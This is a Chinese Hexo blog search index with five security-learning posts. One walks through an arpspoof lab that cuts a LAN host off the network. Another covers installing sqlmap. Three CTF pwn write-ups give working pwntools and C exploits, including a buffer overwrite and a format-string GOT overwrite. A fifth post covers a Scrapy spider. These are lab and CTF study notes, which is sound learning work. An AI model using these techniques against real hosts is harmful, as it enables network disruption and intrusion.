<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Kali 下的 ARP断网实验实现过程</title>
    <url>/2022/05/12/Kali%20%E4%B8%8B%E7%9A%84%20ARP%E6%96%AD%E7%BD%91%E5%AE%9E%E9%AA%8C%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><ul>
<li><p>Kali Linux</p>
<p>简单来说，Kali 就是一个建立在虚拟机上用于做网络安全攻防的系统，Kali自身具有一定的优势，例如自带上百个渗透测试工具，开源Git树，并且它完全免费。</p>
<p>kali拥有安全的开发环境，并且你完全不用担心在kali上做网络攻防实验时会影响到本机的文件，因此进入了kali，人人皆Geek.</p>
</li>
</ul>
<span id="more"></span>
<p>  关于虚拟机的话，我用的是VBOX，虚拟机的种类有很多，看个人喜好吧。</p>
<ul>
<li><p>Arp(地址解析协议)</p>
<p>地址解析协议，即ARP（Address Resolution Protocol），是根据<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>获取<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129">物理地址</a>的一个<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP&#x2F;IP协议</a>。<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p>
</li>
<li><p>Arp欺骗</p>
</li>
</ul>
<p>​        地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时<em><strong>不会检测该报文的真实性</strong></em>就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个<a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97">ARP欺骗</a></p>
<h1 id="进行Arp断网欺骗"><a href="#进行Arp断网欺骗" class="headerlink" title="进行Arp断网欺骗"></a>进行Arp断网欺骗</h1><ul>
<li><p>首先打开并进入kali(此篇blog以VBOX虚拟机为例讲解)<br><img src="https://img-blog.csdnimg.cn/20191002102844921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>进行Arp欺骗的目标主机<br><img src="https://img-blog.csdnimg.cn/20191002102936505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li></li>
</ul>
<ol>
<li>ifconfig :查询本机ip地址</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20191002103105515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由此可以看到ip地址为 10.0.2.4</p>
<ol start="2">
<li>netstat -rn ：查询网关和子掩网码<br><img src="https://img-blog.csdnimg.cn/20191002103144926.png" alt="在这里插入图片描述"></li>
</ol>
<p>由此可以看到 Gateway(网关)：10.0.2.1 和 Genmask(子掩网码): 255.255.255.0</p>
<p>Destination(终端): 10.0.2.0</p>
<ol start="3">
<li>Map -A 终端&#x2F;子网掩码的<strong>对位点分十进制格式</strong></li>
</ol>
<p>此处的子网掩码的<strong>对位点分十进制格式</strong>可用<strong>子网掩码转换器</strong>进行计算<br><img src="https://img-blog.csdnimg.cn/20191002103205219.png" alt="在这里插入图片描述"><br>在线计算器传送门：<a href="https://tool.520101.com/wangluo/ipjisuan/">https://tool.520101.com/wangluo/ipjisuan/</a></p>
<p><img src="https://img-blog.csdnimg.cn/20191002103223157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以上均为此局域网内的主机</p>
<p>但目前接入的只有我们的目标主机：10.0.2.4</p>
<p>Network Distance为网络距离，因为两个ip同时在一个局域网里因此网络距离为0</p>
<p>4.我们来确认一下目标主机在此局域网内是否可以上网</p>
<p>利用ping <a href="http://www.baidu.com/">www.baidu.com</a> 来检查是否可以接受数据</p>
<p><img src="https://img-blog.csdnimg.cn/20191002103250437.png" alt="在这里插入图片描述"><br>由此图可以看出目标主机现在是可以上网的，并且丢失率为0</p>
<ol start="5">
<li>最后 输入指令 arpspoof -i eh0 -t 目标主机ip 网关</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20191002103307415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入后敲回车即可看见已开始向目标主机发送ARP应答消息</p>
<p>此时，我们回到目标主机，再次进行ping <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p><img src="https://img-blog.csdnimg.cn/20191002103320976.png" alt="在这里插入图片描述"><br>可以看到目标主机请求不到主机，并且打不开网页<br><img src="https://img-blog.csdnimg.cn/20191002103328178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>即此次Arp欺骗成功</p>
<ol start="6">
<li>最后按control+c 结束发送数据停止此次欺骗实验</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20191002103343711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><p>最后说一下此arp断网欺骗仅适用于同局域网下的主机间</p>
]]></content>
  </entry>
  <entry>
    <title>MAC下 安装sqlmap教程</title>
    <url>/2022/05/12/MAC%E4%B8%8B%20%E5%AE%89%E8%A3%85sqlmap%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>通过不断在其他大佬们的blog中的学习，整理了一篇mac下 sqlmap的安装教程</p>
<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ol>
<li>Terminal 或者 Iterm </li>
<li>Python 环境</li>
</ol>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ol>
<li><p>先去github上面下载并解压sqlmap相关文件</p>
<p>url：<a href="https://github.com/sqlmapproject/sqlmap.git">https://github.com/sqlmapproject/sqlmap.git</a></p>
</li>
<li><p>打开 Terminal(这里以terminal为例，因为terminal为系统自带终端)<br>输入 vi ~&#x2F;.bash_profile</p>
<span id="more"></span>
<p><img src="https://img-blog.csdnimg.cn/20191002103705232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>按 E 进行编辑</p>
</li>
</ol>
<p>输入 alias sqlmap&#x3D;’python &#x2F;User&#x2F;***&#x2F;tools&#x2F;sqlmap-master&#x2F;sqlmap.py’</p>
<p>此时 python后要根据自己所下载的sqlmap.py文件的具体位置来填写</p>
<p>具体sqlmap.py文件的位置可以这样来找：打开所下载的sqlmap的文件夹后可以发现有sqlmap.py文件<br><img src="https://img-blog.csdnimg.cn/20191002103720670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>右键选择 拷贝sqlmap.py   此时的拷贝为拷贝的此sqlmap.py的文件的物理名，即文件的位置</p>
<p>把上述指令中的python 后的地址全部删去后粘贴上刚刚复制的sqlmap.py的位置即可</p>
<p>ps：要注意上述指令sqlmap&#x3D; 后 等号的前后不能有空格并且等号后面的位置要使用两个单引号扩起来(输入法在英文状态下的单引号)</p>
<p>改完地址后 在export path 下一行 添加export  alias<br><img src="https://img-blog.csdnimg.cn/20191002103915123.png" alt="在这里插入图片描述"><br>添加完成后，按esc取消输入模式  再输入 : wq 按回车保存并退出到根目录</p>
<ol start="3">
<li>返回到根目录后输入指令 source ~&#x2F;.bash_profile  使bash重新载入配置令刚才命令生效</li>
<li>一切完成后 在terminal中 输入 sqlmap启动</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/2019100210374111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示此界面即为搭建sqlmap环境成功</p>
<p>开始你愉快的sql注入之旅吧 : )</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn]攻防世界pwn题目wp--guess_num,hello_pwn</title>
    <url>/2022/05/12/%5BPwn%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%A2%98%E7%9B%AEwp--guess_num,hello_pwn/</url>
    <content><![CDATA[<h1 id="pwn-学习篇"><a href="#pwn-学习篇" class="headerlink" title="pwn 学习篇"></a>pwn 学习篇</h1><h2 id="0x1-guess-num"><a href="#0x1-guess-num" class="headerlink" title="0x1 guess_num"></a>0x1 guess_num</h2><p>下载题目所给附件，使用checksec 进行查看<img src="https://img-blog.csdnimg.cn/20201003155157923.png#pic_center" alt="在这里插入图片描述"><br>发现是一个 64bit的文件，relro开启了部分保护以及开启了NX保护</p>
<p>常规丢进ida64进行反编译</p>
<p>左侧函数栏找到main函数 F5<img src="https://img-blog.csdnimg.cn/20201003155212775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<span id="more"></span>
<p><img src="https://img-blog.csdnimg.cn/20201003155220731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现函数体大致意思是通过rand()函数进行随机数的生成并对用户输入的数字进行十次比对，有一次不对即执行exit(1)终止此程序段，若10次都比对成功则可以得到返回的flag值。</p>
<p>由于随机数的产生不可控的，因此题目思路大概是通过在名字输入时的gets函数进行对seed的覆盖，从而保证seed的值不变，因此rand函数产生的随机数序列也就是唯一的，这样即可做到10次精准比对从而拿到flag。</p>
<p>观察一下栈空间的分配情况<img src="https://img-blog.csdnimg.cn/20201003155228756.png#pic_center" alt="在这里插入图片描述"><br>因此需要覆盖的空间就是0x3c-0x10 ,0x3c为十进制的60，因此此处直接覆盖60个’a’</p>
<p>使用0x61616161作为srand的常数编写c语言脚本进行覆盖</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    srand(<span class="number">0x61616161</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> b = rand()%<span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,b);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿到linux中使用 gcc a.out -o b.out 命令进行编译</p>
<p>.&#x2F;b.out 运行<br><img src="https://img-blog.csdnimg.cn/20201003155407230.png#pic_center" alt="在这里插入图片描述"><br>即可获得一串固定的随机数序列</p>
<p>使用nc 命令进行连接 输入名字超过60个字节的长度进行覆盖，按照产生的固定序列进行输入，即可得到flag<img src="https://img-blog.csdnimg.cn/20201003155423539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201003155527812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="0x2-hello-num"><a href="#0x2-hello-num" class="headerlink" title="0x2 hello_num"></a>0x2 hello_num</h2><p>check一下<br><img src="https://img-blog.csdnimg.cn/20201101095807350.png#pic_center" alt="在这里插入图片描述"><br>丢进ida<br>ctrl+1查一下敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201101095951925.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl+x 跟进发现是一个system函数。<br><img src="https://img-blog.csdnimg.cn/20201101100103390.png#pic_center"><br>发现是由一个read函数进行读取，然后经过if语句比对，成功则跳转到400686地址，即刚刚看到的flag地址。<br>ssize_t read(int filedes,void *buf,size_t nbytes);<br>此处read函数， read函数从filedes指定的已打开文件中读取nbytes字节到buf中。如果第一个参数为0，则表示从从终端进行输入。<br>因此这里的read函数就是我们进行覆盖的一个点。<br>由于输入后的地址是 &amp;unk_601068<br>而我们需要修改的值是dword_60106C，因此看一下偏移。<br><img src="https://img-blog.csdnimg.cn/20201101100950378.png#pic_center" alt="在这里插入图片描述"><br>数一下偏移为4。<br>构建exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">48566</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行即可获得flag</p>
]]></content>
  </entry>
  <entry>
    <title>scrapy quotesbot 源码分析</title>
    <url>/2022/05/12/scrapy%20quotesbot%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>github：<a href="https://github.com/scrapy/quotesbot">https://github.com/scrapy/quotesbot</a></p>
<p>Both spiders extract the same data from the same website, but toscrape-css employs CSS selectors, while toscrape-xpath employs XPath expressions.<br>根据readme描述，实例中一个为使用css语句写的，另一个为使用xpath语句写的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">You can run a spider using the scrapy crawl command, such <span class="keyword">as</span>:</span><br><span class="line">$ scrapy crawl toscrape-css</span><br><span class="line"></span><br><span class="line">If you want to save the scraped data to a file, you can <span class="keyword">pass</span> the -o option:</span><br><span class="line">$ scrapy crawl toscrape-css -o quotes.json</span><br><span class="line"></span><br><span class="line">启动抓取并保存至本地json：scrapy crawl crawlname -o quotes.json</span><br></pre></td></tr></table></figure>
<p>两个方法：<br>extract():这个方法返回的是一个<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>list，，里面包含了多个string，如果只有一个string，则返回[‘ABC’]这样的形式。<br>extract_first()：这个方法返回的是一个string<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，是list数组里面的第一个字符串。</p>
<span id="more"></span>
<p>声明：一下爬取网站均通过phpstudy放入了本地<br>官方实例spider源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ToScrapeSpiderXPath</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;toscrape-xpath&#x27;</span></span><br><span class="line">    start_urls = [</span><br><span class="line">       <span class="comment"># &#x27;http://quotes.toscrape.com/&#x27;,</span></span><br><span class="line">        <span class="string">&quot;http://localhost/qts.html&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">for</span> quote <span class="keyword">in</span> response.xpath(<span class="string">&#x27;//div[@class=&quot;quote&quot;]&#x27;</span>): <span class="comment">#通过源码分析得到，每一个块中的内容都属于一个quote，所以下面用&quot;//&quot;遍历所有的class为quote的div标签即可</span></span><br><span class="line">            <span class="keyword">yield</span> &#123;</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: quote.xpath(<span class="string">&#x27;./span[@class=&quot;text&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;author&#x27;</span>: quote.xpath(<span class="string">&#x27;.//small[@class=&quot;author&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;tags&#x27;</span>: quote.xpath(<span class="string">&#x27;.//div[@class=&quot;tags&quot;]/a[@class=&quot;tag&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        next_page_url = response.xpath(<span class="string">&#x27;//li[@class=&quot;next&quot;]/a/@href&#x27;</span>).extract_first()  <span class="comment">#调用a标签的所有href属性</span></span><br><span class="line">        <span class="keyword">if</span> next_page_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(response.urljoin(next_page_url))  <span class="comment">#拼接主域名和子域名</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>练习写的某招聘单位职位爬取的spider源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BossSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;witherc&quot;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&quot;https://www.zhipin.com/&quot;]  #允许爬取的域</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#with open(&#x27;/Users/w1therc/Desktop/「全国Python招聘」 - BOSS直聘.html&#x27;,&#x27;r&#x27;, encoding=&#x27;UTF8&#x27;) as url:</span></span><br><span class="line">    <span class="comment">#    start_urls = url</span></span><br><span class="line"></span><br><span class="line">    start_urls = [</span><br><span class="line">        <span class="string">&quot;http://localhost/boss.html&quot;</span></span><br><span class="line">        <span class="comment">#&quot;/Users/w1therc/Desktop/「全国Python招聘」 - BOSS直聘.html&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">for</span> quote <span class="keyword">in</span> response.xpath(<span class="string">&#x27;//div[@class=&quot;job-primary&quot;]&#x27;</span>):</span><br><span class="line">            <span class="keyword">yield</span> &#123;</span><br><span class="line">                <span class="string">&#x27;职位名称&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;job-name&quot;]/a[@target=&quot;_blank&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;薪资&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;red&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;工作地点&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;job-area&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        下列三行用于网页跳转到下一页并爬取的代码没有问题，报错原因为：爬取页面保存在本地url为http://localhost/boss.html，但是跳转后的url变回了https://www.zhipin.com/c100010000-p100407/?page=2&amp;ka=page-2</span></span><br><span class="line"><span class="string">        此问题有待解决，可先实行但页面抓取</span></span><br><span class="line"><span class="string">        next_page_url = response.xpath(&#x27;//div[@class=&quot;page&quot;]/a[@class=&quot;next&quot;]/@href&#x27;).extract_first()  # 调用a标签的所有href属性</span></span><br><span class="line"><span class="string">        if next_page_url is not None:</span></span><br><span class="line"><span class="string">            yield scrapy.Request(response.urljoin(next_page_url))  # 拼接主域名和子域名</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上述二者在解析结构时均使用的xpath语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">next_page_url = response.xpath(<span class="string">&#x27;//div[@class=&quot;page&quot;]/a[@class=&quot;next&quot;]/@href&#x27;</span>).extract_first()  <span class="comment"># 调用a标签的所有href属性</span></span><br><span class="line"><span class="keyword">if</span> next_page_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">yield</span> scrapy.Request(response.urljoin(next_page_url))  <span class="comment"># 拼接主域名和子域名</span></span><br></pre></td></tr></table></figure>
<p>上述三行用于网页跳转到下一页并爬取的代码没有问题，报错原因为：爬取页面保存在本地url为<a href="http://localhost/boss.html">http://localhost/boss.html</a>，但是跳转后的url变回了<a href="https://www.zhipin.com/c100010000-p100407/?page=2&ka=page-2">https://www.zhipin.com/c100010000-p100407/?page=2&ka=page-2</a><br>        此问题有待解决，可先实行但页面抓取（目前想法：尝试保存多级页面到本地进行数据抓取，答辩时可说明情况，为了测试所以保存到本地，实际上可以通过成熟的代码来控制防止爬虫检测，直接用原url进行爬取并输出）<br><del>解决如何把爬取文件输出保存为xls文件：~~~~1、直接输出为csv文件(已解决)：scrapy crawl witherc -o 333.csv ~~<br>~~解决csv文件打开后乱码问题：在setting.py中添加代码</del><code>~~FEED_EXPORT_ENCODING = &#39;gb18030&#39;~~</code><del>即可</del><br><del>或者通过 安装openpyxl 并对pipeline.py进行配置</del></p>
<p><del>第三部分设计：对一、二部分设计链接方法   即研究使用  pandas库中 pd.read_excel方法 对保存为excel文件中对数据进行处理 及 可视化输出等</del></p>
<p><del>对csv可视化的思想：先把csv文件中的内容读取出来再进行可视化</del></p>
<p><img src="/images/pasted-0.png" alt="upload successful"><br>报403是因为，通过上述代码获取的url为zhipin.com的原url，而非在本地localhost的url，此前访问时ip已被封，所以报错403</p>
<p><del>转化为json文件，再做可视化，json文件中的数据是以dict存储的因此比较方便易用</del><br>数据格式方面：pyecharts 本质上在做的事情就是将 Echarts 的配置项由 Python dict 序列化为 JSON 格式，所以 pyecharts 支持什么格式的数据类型取决于 JSON 支持什么数据类型。</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</title>
    <url>/2022/05/12/%5BPwn%5D2018%E5%B9%B4%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%A7%91%E6%9D%A5%E6%9D%AFPwn%E9%A2%98%E7%9B%AERepeater%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
<p>这里就针对本题中用到的汇编指令进行相应补充</p>
<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
<span id="more"></span>
<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
<p>根据偏移为4 编写exp脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行即可得到flag</p>
]]></content>
  </entry>
</search>
